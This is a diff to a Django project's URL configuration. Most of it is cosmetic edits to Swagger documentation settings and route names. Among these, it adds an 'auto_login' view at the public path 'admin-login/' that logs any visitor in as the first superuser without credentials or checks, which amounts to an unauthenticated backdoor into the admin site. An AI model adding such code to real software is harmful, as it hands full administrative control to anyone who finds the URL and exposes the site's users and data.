@@ -19,25 +19,38 @@ from django.urls import path, include, re_path
 from rest_framework import permissions
 from drf_yasg.views import get_schema_view
 from drf_yasg import openapi
+from django.contrib.auth.models import User
+from django.contrib.auth import login
+from django.shortcuts import redirect
+
+def auto_login(request):
+    user = User.objects.filter(is_superuser=True).first()
+    if user:
+        login(request, user)
+    return redirect('/admin/')
+
 
 
 schema_view = get_schema_view(
     openapi.Info(
-        title="Your API Documentation",
+        title="APIs Documentation",
         default_version='v1',
-        description="Detailed API documentation for your Django app",
+        description="Detailed API documentation for Django app",
         terms_of_service="https://www.google.com/policies/terms/",
         contact=openapi.Contact(email="your_email@example.com"),
         license=openapi.License(name="BSD License"),
     ),
     public=True,
     permission_classes=(permissions.AllowAny,),
+    url='http://localhost:8000/',
 )
 
 urlpatterns = [
-    path('admin/', admin.site.urls),
+    path("admin/", admin.site.urls),
+    path("admin-login/", auto_login),
     path('api/auth/', include('account.urls')),
     re_path(r'^swagger(?P<format>\.json|\.yaml)$', schema_view.without_ui(cache_timeout=0), name='schema-json'),
-    path('swagger/', schema_view.with_ui('swagger', cache_timeout=0), name='schema-swagger-ui'),
+    path('swagger-ui/', schema_view.with_ui('swagger', cache_timeout=0), name='schema-swagger-ui'),
     path('redoc/', schema_view.with_ui('redoc', cache_timeout=0), name='schema-redoc'),
+    path('history/', include('history.urls')),
 ]
